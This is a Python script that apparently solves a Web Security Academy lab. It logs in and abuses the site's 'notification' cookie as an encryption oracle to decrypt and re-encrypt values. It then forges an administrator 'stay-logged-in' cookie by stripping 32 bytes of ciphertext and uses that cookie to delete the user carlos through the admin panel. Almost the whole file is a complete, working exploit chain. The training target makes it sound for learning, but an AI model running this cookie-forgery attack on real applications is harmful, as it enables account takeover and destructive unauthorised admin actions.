import base64
import requests
import urllib.parse
from bs4 import BeautifulSoup

#
# Fetch and return the CSRF token
#
def get_csrf_token(session: requests.Session, url: str) -> str:
    response = session.get(url)
    if not response.ok:
        raise Exception(f"Failed to load page: {url}")

    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})

    if not csrf_input or not csrf_input.get('value'):
        raise Exception("CSRF token not found.")

    return csrf_input.get('value')

#
# Create new session
#
session = requests.Session()

#
# Lab URLs
#
base_url = "https://0ad300900495cc14836a0fce00140000.web-security-academy.net"
login_url = f"{base_url}/login"
blog_post = "/post?postId=1"
blog_post_url = f"{base_url}{blog_post}"
comment_url = f"{base_url}/post/comment"
admin_delete_url = f"{base_url}/admin/delete?username=carlos"

#
# Lab User Credentials
#
username = "wiener"
password = "peter"


#
# Login with "Stay Logged In"
#
try:
    csrf_token = get_csrf_token(session, login_url)
    # print("CSRF: ", csrf_token)
except Exception as e:
    print("Error:", e)
    exit(1)

payload = {
    "csrf": csrf_token,
    "username": username,
    "password": password,
    "stay-logged-in": "on"
}

login_response = session.post(login_url, data=payload)

if login_response.ok:
    print("Login successful")
    for cookie in session.cookies:
        print(f"{cookie.name}: {cookie.value}")
else:
    print("Failed login.")
    exit(1)

#
# Leave an invalid comment on post 1
#
try:
    csrf_token = get_csrf_token(session, blog_post_url)
    print("CSRF: ", csrf_token)
except Exception as e:
    print("Error: ", e)
    exit(1)

payload = {
    "csrf": csrf_token,
    "postId": "1",
    "comment": "Invalid comment!",
    "name": "hackerman",
    "email": "hackerman",
    "website": ""
}
print("Payload: ", payload)

# Suppress the redirect to read cookie 
comment_response = session.post(comment_url, data=payload, allow_redirects=False)

redirect_location = comment_response.headers.get("Location")
if redirect_location == blog_post:
    notification_cookie = session.cookies.get("notification")
    print("Invalid comment sent.\nNotification cookie:", notification_cookie)
else:
    print("Failed to submit invalid comment.")
    exit(1)

# Retrieve the value of the 'stay-logged-in' cookie
stay_logged_in = session.cookies.get("stay-logged-in")
print("Stay-logged-in cookie:", stay_logged_in)

# Remove all cookies named 'notification' to avoid conflict
for cookie in list(session.cookies):
    if cookie.name == "notification":
        session.cookies.clear(cookie.domain, cookie.path, cookie.name)

# Overwrite the 'notification' cookie with the value from 'stay-logged-in'
session.cookies.set("notification", stay_logged_in)
print("Modified notification cookie:", session.cookies.get("notification"))

# Resume the redirect manually: send a GET request with the modified cookie.
decrypt_response = session.get(blog_post_url)

# Parse the HTML to extract only the content of the header with class "notification-header"
soup = BeautifulSoup(decrypt_response.text, 'html.parser')
notification_header = soup.find('header', class_='notification-header')
decrypted_text = notification_header.get_text(strip=True)
print("\nDecrypted response:")
print(decrypted_text)

# Extract timestamp
parts = decrypted_text.split(':')
if len(parts) == 2:
    timestamp = parts[1]
    new_value = f"xxxxxxxxxadministrator:{timestamp}"
    print(new_value)
else:
    print("Invalid decrypted data format.")
    exit(1)

#
# Encrypt the new administrator timestamp email value
#
try:
    csrf_token = get_csrf_token(session, blog_post_url)
    print("CSRF: ", csrf_token)
except Exception as e:
    print("Error: ", e)
    exit(1)

payload = {
    "csrf": csrf_token,
    "postId": "1",
    "comment": "Invalid comment!",
    "name": "hackerman",
    "email": new_value,
    "website": ""
}
print("Payload: ", payload)

# Remove all cookies named 'notification' to avoid conflict
for cookie in list(session.cookies):
    if cookie.name == "notification":
        session.cookies.clear(cookie.domain, cookie.path, cookie.name)

# Suppress the redirect to read cookie 
comment_response = session.post(comment_url, data=payload, allow_redirects=False)

redirect_location = comment_response.headers.get("Location")
if redirect_location == blog_post:
    notification_cookie = session.cookies.get("notification")
    print("Invalid comment sent.\nNotification cookie:", notification_cookie)
else:
    print("Failed to submit invalid comment.")
    exit(1)

# Resume the redirect manually: send a GET request with the modified cookie.
decrypt_response = session.get(blog_post_url)

# Parse the HTML to extract only the content of the header with class "notification-header"
soup = BeautifulSoup(decrypt_response.text, 'html.parser')
notification_header = soup.find('header', class_='notification-header')
decrypted_text = notification_header.get_text(strip=True)
print("\nDecrypted response:")
print(decrypted_text)

# Step 1: URL-decode the notification cookie
decoded_cookie = urllib.parse.unquote(notification_cookie)

# Step 2: Base64-decode the URL-decoded string
decoded_bytes = base64.b64decode(decoded_cookie)

# Step 3: Remove the first 32 bytes
modified_bytes = decoded_bytes[32:]

# Step 4: Base64-encode the modified bytes
reencoded = base64.b64encode(modified_bytes)

# Step 5: URL-encode the base64 encoded string
final_value = urllib.parse.quote(reencoded.decode('utf-8'))

print("\nFinal modified notification cookie value:")
print(final_value)

#
# Leave an invalid comment on post 1, again
#
try:
    csrf_token = get_csrf_token(session, blog_post_url)
    print("CSRF: ", csrf_token)
except Exception as e:
    print("Error: ", e)
    exit(1)

payload = {
    "csrf": csrf_token,
    "postId": "1",
    "comment": "Invalid comment!",
    "name": "hackerman",
    "email": "hackerman",
    "website": ""
}
print("Payload: ", payload)

# Suppress the redirect to read cookie 
comment_response = session.post(comment_url, data=payload, allow_redirects=False)

redirect_location = comment_response.headers.get("Location")
if redirect_location == blog_post:
    notification_cookie = session.cookies.get("notification")
    print("Invalid comment sent.\nNotification cookie:", notification_cookie)
else:
    print("Failed to submit invalid comment.")
    exit(1)

# Remove all cookies named 'notification' to avoid conflict
for cookie in list(session.cookies):
    if cookie.name == "notification":
        session.cookies.clear(cookie.domain, cookie.path, cookie.name)

# Overwrite the 'notification' cookie with the encrypted admin value
session.cookies.set("notification", final_value)
print("Modified notification cookie:", session.cookies.get("notification"))

# Resume the redirect manually: send a GET request with the modified cookie.
decrypt_response = session.get(blog_post_url)

# Parse the HTML to extract only the content of the header with class "notification-header"
soup = BeautifulSoup(decrypt_response.text, 'html.parser')
notification_header = soup.find('header', class_='notification-header')
decrypted_text = notification_header.get_text(strip=True)
print("\nDecrypted response:")
print(decrypted_text)

# Remove the session and stay-logged-in cookie
for cookie in list(session.cookies):
    if cookie.name == "session":
        session.cookies.clear(cookie.domain, cookie.path, cookie.name)
    if cookie.name == "stay-logged-in":
        session.cookies.clear(cookie.domain, cookie.path, cookie.name)

# Write new 'stay-logged-in' cookie
session.cookies.set("stay-logged-in", final_value)

# Access admin and delete user `carlos`
admin_home_page = session.get(admin_delete_url)

print("Lab completed. User carlos deleted.")